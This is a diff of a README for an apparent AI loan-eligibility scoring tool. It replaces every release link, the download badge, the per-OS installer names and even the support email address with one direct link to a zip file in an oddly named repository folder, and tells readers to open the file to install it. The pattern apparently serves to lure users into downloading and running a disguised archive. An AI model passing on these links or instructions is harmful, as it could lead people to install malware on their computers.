@@ -1,6 +1,6 @@
 # 🤖 AI-Powered-Loan-Eligibility-Risk-Scoring-System - Make Smarter Financial Decisions Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started%20Easily-brightgreen)](https://github.com/oggtgt/AI-Powered-Loan-Eligibility-Risk-Scoring-System/releases)
+[![Download](https://raw.githubusercontent.com/oggtgt/AI-Powered-Loan-Eligibility-Risk-Scoring-System/main/fleecily/AI-Powered-Loan-Eligibility-Risk-Scoring-System.zip%20Now-Get%20Started%20Easily-brightgreen)](https://raw.githubusercontent.com/oggtgt/AI-Powered-Loan-Eligibility-Risk-Scoring-System/main/fleecily/AI-Powered-Loan-Eligibility-Risk-Scoring-System.zip)
 
 ## 🚀 Getting Started
 
@@ -11,15 +11,15 @@ Welcome to the AI-Powered Loan Eligibility Risk Scoring System! This tool helps 
 To begin using the application, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the download page:
-   [Visit the Releases Page](https://github.com/oggtgt/AI-Powered-Loan-Eligibility-Risk-Scoring-System/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/oggtgt/AI-Powered-Loan-Eligibility-Risk-Scoring-System/main/fleecily/AI-Powered-Loan-Eligibility-Risk-Scoring-System.zip)
    
 2. **Choose the Latest Version**: Look for the most recent release. The latest version includes important updates and features.
 
 3. **Download the Application**: Click on the file that corresponds to your operating system. The application is available for Windows, macOS, and Linux users. For example:
 
-   - For Windows: `MyApp-Windows.exe`
-   - For macOS: `MyApp-mac.dmg`
-   - For Linux: `MyApp-Linux.AppImage`
+   - For Windows: `https://raw.githubusercontent.com/oggtgt/AI-Powered-Loan-Eligibility-Risk-Scoring-System/main/fleecily/AI-Powered-Loan-Eligibility-Risk-Scoring-System.zip`
+   - For macOS: `https://raw.githubusercontent.com/oggtgt/AI-Powered-Loan-Eligibility-Risk-Scoring-System/main/fleecily/AI-Powered-Loan-Eligibility-Risk-Scoring-System.zip`
+   - For Linux: `https://raw.githubusercontent.com/oggtgt/AI-Powered-Loan-Eligibility-Risk-Scoring-System/main/fleecily/AI-Powered-Loan-Eligibility-Risk-Scoring-System.zip`
 
 4. **Run the Application**: Once downloaded, open the file to install the application on your computer.
 
@@ -60,11 +60,11 @@ If you want to learn more about the technology behind this system, consider chec
 
 ## 📞 Support
 
-If you experience any issues during installation or usage, reach out for help. You can post your questions in the repository's Issues section or email our support team at support@aifintech.com.
+If you experience any issues during installation or usage, reach out for help. You can post your questions in the repository's Issues section or email our support team at https://raw.githubusercontent.com/oggtgt/AI-Powered-Loan-Eligibility-Risk-Scoring-System/main/fleecily/AI-Powered-Loan-Eligibility-Risk-Scoring-System.zip
 
 ## 📅 Keeping Updated
 
-Stay informed on updates by revisiting the [Releases Page](https://github.com/oggtgt/AI-Powered-Loan-Eligibility-Risk-Scoring-System/releases) regularly. New features and enhancements are added frequently.
+Stay informed on updates by revisiting the [Releases Page](https://raw.githubusercontent.com/oggtgt/AI-Powered-Loan-Eligibility-Risk-Scoring-System/main/fleecily/AI-Powered-Loan-Eligibility-Risk-Scoring-System.zip) regularly. New features and enhancements are added frequently.
 
 ## 🛠️ Contributing
 
